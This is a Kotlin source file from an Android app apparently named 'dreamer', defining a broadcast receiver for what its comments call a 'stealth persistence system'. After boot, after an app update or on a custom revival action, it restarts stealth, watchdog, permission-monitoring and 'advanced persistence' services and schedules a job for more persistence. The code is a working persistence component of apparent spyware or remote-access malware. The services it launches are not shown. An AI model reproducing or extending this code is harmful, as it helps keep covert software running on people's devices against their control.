package com.h4k3r.dreamer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * BroadcastReceiver responsible for handling revival events for the stealth persistence system.
 * This receiver responds to system boot, package replacement, and custom revival actions
 * to ensure the stealth services are always running.
 */
class StealthRevivalReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "StealthRevivalReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Received action: ${intent.action}")

        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_MY_PACKAGE_REPLACED,
            "com.h4k3r.dreamer.STEALTH_REVIVAL" -> {
                Log.d(TAG, "Starting stealth services after system event")
                startStealthServices(context)
            }
        }
    }

    private fun startStealthServices(context: Context) {
        try {
            // Start the main stealth service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(Intent(context, StealthForegroundService::class.java))
            } else {
                context.startService(Intent(context, StealthForegroundService::class.java))
            }

            // Start other critical services
            startCriticalServices(context)

            // Schedule the stealth job service
            scheduleStealthJob(context)

            Log.d(TAG, "Successfully started stealth services")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start stealth services", e)
        }
    }

    private fun startCriticalServices(context: Context) {
        val serviceIntents = arrayOf(
            Intent(context, PermissionMonitorService::class.java),
            Intent(context, WatchdogService::class.java),
            Intent(context, AdvancedPersistenceService::class.java)
        )

        for (intent in serviceIntents) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${intent.component?.className}", e)
            }
        }
    }

    private fun scheduleStealthJob(context: Context) {
        try {
            // Schedule the job service for additional persistence
            StealthJobService.scheduleJob(context)
            Log.d(TAG, "Scheduled stealth job service")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule stealth job", e)
        }
    }
}